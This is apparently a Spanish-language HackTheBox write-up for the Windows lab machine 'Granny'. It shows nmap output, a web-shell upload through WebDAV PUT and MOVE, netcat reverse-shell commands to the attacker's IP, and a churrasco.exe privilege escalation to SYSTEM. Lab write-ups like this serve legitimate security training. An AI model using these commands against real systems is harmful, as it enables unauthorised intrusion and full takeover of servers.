---
layout: single
title: Writeup HTB - Maquina Granny
comments: true
excerpt: "La maquina Granny es una maquina windows - Easy, al realizar un scan con nmap vemos que solo tenemos el puerto 80, nmap nos dice que podemos usar varios metodos HTTP. Por lo tanto subimos una web shell usando los metodos HTTP PUT y MOVE, despues generamos una reverse shell. Por ultimo escalamos privilegios ya enumeramos los privilegios del usuario ya que contamos con el privilegio SeImpersonatePrivilege. Por lo tanto usamos el exploit churrasco.exe para abusar dicho privilegio y generamos una reverse shell con permisos de nt authority system."
date: 2022-02-15
classes: wide
header:
  teaser: /assets/images/2022-02-15-writeup-maquina-htb-granny/Untitled.png
  teaser_home_page: true
categories:
  - HackTheBox
tags:
  - OSCP  
  - Hacking
  - Windows
  - Easy
---

# Granny
<p align="center">
<img src="/assets/images/2022-02-15-writeup-maquina-htb-granny/Untitled.png">
</p>

## Resumen
<div style="text-align: justify">
La maquina Granny es una maquina windows - Easy, al realizar un scan con nmap vemos que solo tenemos el puerto 80, nmap nos dice que podemos usar varios metodos HTTP. Por lo tanto subimos una web shell usando los metodos HTTP PUT y MOVE, despues generamos una reverse shell. Por ultimo escalamos privilegios ya enumeramos los privilegios del usuario ya que contamos con el privilegio SeImpersonatePrivilege. Por lo tanto usamos el exploit churrasco.exe para abusar dicho privilegio y generamos una reverse shell con permisos de nt authority system.
</div>

## Scan Nmap

```bash
# Nmap 7.92 scan initiated Sat Feb 19 10:28:27 2022 as: nmap -sC -sV -p80 -oN targeted -Pn -vvv 10.129.144.63
Nmap scan report for 10.129.144.63
Host is up, received user-set (0.17s latency).
Scanned at 2022-02-19 10:28:28 -05 for 11s

PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 6.0
| http-webdav-scan: 
|   Server Date: Sat, 19 Feb 2022 15:28:37 GMT
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Type: Microsoft-IIS/6.0
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|_  WebDAV type: Unknown
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT POST
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Feb 19 10:28:39 2022 -- 1 IP address (1 host up) scanned in 12.14 seconds
```

## Port 80

ya que el unico puerto es el 80, revisamos la pagina web y nos vemos nada en especial mas que una pagina que dice Under Construccion

![Untitled](/assets/images/2022-02-15-writeup-maquina-htb-granny/Untitled%201.png)

pero el escaneo de nmap nos dice que tenemos activado webdav y que podemos usar varios metodos HTTP. Por lo tanto hacemos uso de la pagina de hacktricks para saber que es webdav y como podemos atacarlo

```bash
https://book.hacktricks.xyz/pentesting/pentesting-web/put-method-webdav
```

haciendo uso de la guia de hacktricks usaremos davtest pero el resultado es que usando el metodo http PUT podemos subir archivos con extension html y txt. Pero el problema es que nesecitamos subir un archivo con extension asp o aspx para obtener una webshell y poder ejecutar comandos en la maquina victima

```bash
Granny # ❯ davtest -url http://10.129.144.63                  
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://10.129.144.63
********************************************************
NOTE	Random string for this session: Jt6SGhm65hOOp6
********************************************************
 Creating directory
MKCOL		SUCCEED:		Created http://10.129.144.63/DavTestDir_Jt6SGhm65hOOp6
********************************************************
 Sending test files
PUT	asp	FAIL
PUT	aspx	FAIL
PUT	cgi	FAIL
PUT	pl	SUCCEED:	http://10.129.144.63/DavTestDir_Jt6SGhm65hOOp6/davtest_Jt6SGhm65hOOp6.pl
PUT	html	SUCCEED:	http://10.129.144.63/DavTestDir_Jt6SGhm65hOOp6/davtest_Jt6SGhm65hOOp6.html
PUT	php	SUCCEED:	http://10.129.144.63/DavTestDir_Jt6SGhm65hOOp6/davtest_Jt6SGhm65hOOp6.php
PUT	jhtml	SUCCEED:	http://10.129.144.63/DavTestDir_Jt6SGhm65hOOp6/davtest_Jt6SGhm65hOOp6.jhtml
PUT	cfm	SUCCEED:	http://10.129.144.63/DavTestDir_Jt6SGhm65hOOp6/davtest_Jt6SGhm65hOOp6.cfm
PUT	txt	SUCCEED:	http://10.129.144.63/DavTestDir_Jt6SGhm65hOOp6/davtest_Jt6SGhm65hOOp6.txt
PUT	jsp	SUCCEED:	http://10.129.144.63/DavTestDir_Jt6SGhm65hOOp6/davtest_Jt6SGhm65hOOp6.jsp
PUT	shtml	FAIL
********************************************************
 Checking for test file execution
EXEC	pl	FAIL
EXEC	html	SUCCEED:	http://10.129.144.63/DavTestDir_Jt6SGhm65hOOp6/davtest_Jt6SGhm65hOOp6.html
EXEC	php	FAIL
EXEC	jhtml	FAIL
EXEC	cfm	FAIL
EXEC	txt	SUCCEED:	http://10.129.144.63/DavTestDir_Jt6SGhm65hOOp6/davtest_Jt6SGhm65hOOp6.txt
EXEC	jsp	FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.129.144.63/DavTestDir_Jt6SGhm65hOOp6
PUT File: http://10.129.144.63/DavTestDir_Jt6SGhm65hOOp6/davtest_Jt6SGhm65hOOp6.pl
PUT File: http://10.129.144.63/DavTestDir_Jt6SGhm65hOOp6/davtest_Jt6SGhm65hOOp6.html
PUT File: http://10.129.144.63/DavTestDir_Jt6SGhm65hOOp6/davtest_Jt6SGhm65hOOp6.php
PUT File: http://10.129.144.63/DavTestDir_Jt6SGhm65hOOp6/davtest_Jt6SGhm65hOOp6.jhtml
PUT File: http://10.129.144.63/DavTestDir_Jt6SGhm65hOOp6/davtest_Jt6SGhm65hOOp6.cfm
PUT File: http://10.129.144.63/DavTestDir_Jt6SGhm65hOOp6/davtest_Jt6SGhm65hOOp6.txt
PUT File: http://10.129.144.63/DavTestDir_Jt6SGhm65hOOp6/davtest_Jt6SGhm65hOOp6.jsp
Executes: http://10.129.144.63/DavTestDir_Jt6SGhm65hOOp6/davtest_Jt6SGhm65hOOp6.html
Executes: http://10.129.144.63/DavTestDir_Jt6SGhm65hOOp6/davtest_Jt6SGhm65hOOp6.txt
```

como vemos en nmap nos dice que que tambien debemos poder usar el metodo http MOVE, asi podriamos subir una webshell  con extension txt y despues con MOVE cambiar a una extension asp o aspx

```bash
Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
```

Asi pues usare esta web shell en aspx

```bash
https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx
```

descargare la web shell y lo renombare a shell.txt

```bash
Granny # ❯ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.aspx

Granny # ❯ mv cmd.aspx shell.txt
```

utilizare cadaver para subirlo utilizando el metodo HTTP - PUT 

```bash
Granny # ❯ cadaver 10.129.144.63                                           
dav:/> put cmd.txt
Transferiendo cmd.txt a '/cmd.txt':
 Progreso: [                              ]   0,0% of 4260 bytes Progreso: [=============================>] 100,0% of 4260 bytes exitoso.
dav:/>
```

probamos si todo subio correctamente y efectivamente todo subio sin problemas

![Untitled](/assets/images/2022-02-15-writeup-maquina-htb-granny/Untitled%202.png)

ahora usamos el metodo HTTP - MOVE para renombrar cmd.txt a cmd.aspx

```bash
Granny # ❯ cadaver 10.129.144.63                                           
dav:/> put cmd.txt
Transferiendo cmd.txt a '/cmd.txt':
 Progreso: [                              ]   0,0% of 4260 bytes Progreso: [=============================>] 100,0% of 4260 bytes exitoso.
dav:/> move cmd.txt cmd.aspx
Moviendo '/cmd.txt' a '/cmd.aspx':  exitoso.
dav:/>
```

de esta manera logramos ejecutar comandos usando nuestra web shell usando cmd.apsx

![Untitled](/assets/images/2022-02-15-writeup-maquina-htb-granny/Untitled%203.png)

## Reverse shell

para obtener una reverse shell crearemos un servidor smb con impacket para poder compartir nuestras herramientas a la maquinas victima como netcat

```bash
Granny # ❯ impacket-smbserver shared . -smb2support
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

dejamos en escucha el puerto 443 con netcat en nuestra maquina local

```bash
Granny # ❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
```

ejecutamos la siguiente linea de comandos en nuestra web shell

```bash
/c \\10.10.14.54\shared\nc.exe -e cmd.exe 10.10.14.54 443
```

![Untitled](/assets/images/2022-02-15-writeup-maquina-htb-granny/Untitled%204.png)

de esta manera logramos obtener nuestra reverse shell 

```bash
Granny # ❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.54] from (UNKNOWN) [10.129.144.63] 1044
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

whoami
whoami
nt authority\network service
```

## Escalacion de privilegios

enumeramos los privilegios que tenemos este usuario y vemos que tenemos activado el privilegio SeImpersonatePrivilege

```python
c:\windows\system32\inetsrv> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                 Description                               State
============================== ========================================= ========
SeAuditPrivilege               Generate security audits                  Disabled
SeIncreaseQuotaPrivilege       Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege  Replace a process level token             Disabled
SeChangeNotifyPrivilege        Bypass traverse checking                  Enabled
SeImpersonatePrivilege         Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege        Create global objects                     Enabled
```

segun investigando vemos que podemos usar este exploit ya que tenemos activado el privilegio SeImpersonatePrivilege         

```bash
https://www.exploit-db.com/exploits/32891
```

y los sistemas operativos afectatos son

```python
The issue affects the following:

Windows XP SP2
Windows Server 2003
Windows Vista
Windows Server 2008
```

descargamos el exploit compilado de la siguiente enlace

```bash
https://github.com/Re4son/Churrasco/blob/master/churrasco.exe
```

creamos una carpeta y copiamos nuestro exploit churrasco.exe y netcat a la maquina victima

```bash
mkdir privesc

cd privesc

copy \\10.10.14.54\shared\nc.exe C:\WINDOWS\Temp\privesc\nc.exe
        1 file(s) copied.

copy \\10.10.14.54\shared\churrasco.exe C:\WINDOWS\Temp\privesc\churrasco.exe
        1 file(s) copied.

C:\WINDOWS\Temp\privesc>
```

probamos nuestro exploit y vemos que podemos ejecutar comando con permisos de nt authority system

![Untitled](/assets/images/2022-02-15-writeup-maquina-htb-granny/Untitled%205.png)

```bash
churrasco.exe whoami
nt authority\system

C:\WINDOWS\Temp\privesc>
```

ahora dejamos el puerto 443 en escucha en nuestra maquina local

```bash
Granny # ❯ nc -nlvp 443
listening on [any] 443 ...
```

ejecutamos la siguiente linea de comandos para obtener una reverse shell

```bash
churrasco.exe "C:\WINDOWS\Temp\privesc\nc.exe -e cmd.exe 10.10.14.54 443"

C:\WINDOWS\Temp\privesc>
```

de esta manera obtenemos una reverse shell con privilegios de nt authority system

![Untitled](/assets/images/2022-02-15-writeup-maquina-htb-granny/Untitled%206.png)